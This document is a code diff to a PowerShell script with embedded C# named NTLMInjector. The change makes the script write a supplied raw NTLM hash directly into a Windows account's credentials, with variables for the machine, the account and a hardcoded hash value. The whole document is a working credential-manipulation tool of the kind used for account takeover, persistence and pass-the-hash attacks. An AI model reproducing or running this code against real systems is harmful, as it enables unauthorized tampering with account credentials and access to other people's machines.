@@ -151,11 +151,36 @@ namespace NTLMInjector
 			Console.WriteLine("OK");
 			return 0;
 		}
+		
+		
+		public static byte[] HexToBinary(string hex)
+        {
+            byte[] bytes = new byte[hex.Length / 2];
+            for (int nibbleIndex = 0, byteIndex = 0; nibbleIndex < hex.Length; byteIndex = ++nibbleIndex / 2)
+            {
+                char nibble = hex[0 + nibbleIndex];
+
+                if ('0' <= nibble && nibble <= '9')
+                {
+                    bytes[byteIndex] = (byte)((bytes[byteIndex] << 4) | (nibble - '0'));
+                }
+                else if ('a' <= nibble && nibble <= 'f')
+                {
+                    bytes[byteIndex] = (byte)((bytes[byteIndex] << 4) | (nibble - 'a' + 0xA));
+                }
+                else if ('A' <= nibble && nibble <= 'F')
+                {
+                    bytes[byteIndex] = (byte)((bytes[byteIndex] << 4) | (nibble - 'A' + 0xA));
+                }
+            }
+            return bytes;
+        }
+		
         
         public static int ChangePassword(string server, SecurityIdentifier account, string oldpassword, string newpassword)
         {
             byte[] oldNTLM = computeNTLMHash(oldpassword);
-            byte[] newNTLM = computeNTLMHash(newpassword);
+            byte[] newNTLM = HexToBinary(newpassword);
             return SetNTLMHash(server, account, oldNTLM, newNTLM);
         }
 	}
@@ -164,8 +189,12 @@ namespace NTLMInjector
 
 "@
 Add-Type -TypeDefinition $Source
-
-[System.Security.Principal.NTAccount]$objUser = New-Object System.Security.Principal.NTAccount("test", "test")
+$PCName = "PC-Name"
+$UserName = "AccountName"
+$NewNTLMHash = "1985F1ACBB97B3944B8635849DE017FD"
+$OldPassword = ""
+$ServerName = "localhost"
+[System.Security.Principal.NTAccount]$objUser = New-Object System.Security.Principal.NTAccount($PCName, $UserName)
 [System.Security.Principal.SecurityIdentifier] $objSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]) 
 
-[NTLMInjector.SetNTLM]::ChangePassword($null, $objSID, "test", "")
+[NTLMInjector.SetNTLM]::ChangePassword($ServerName, $objSID, $OldPassword, $NewNTLMHash)
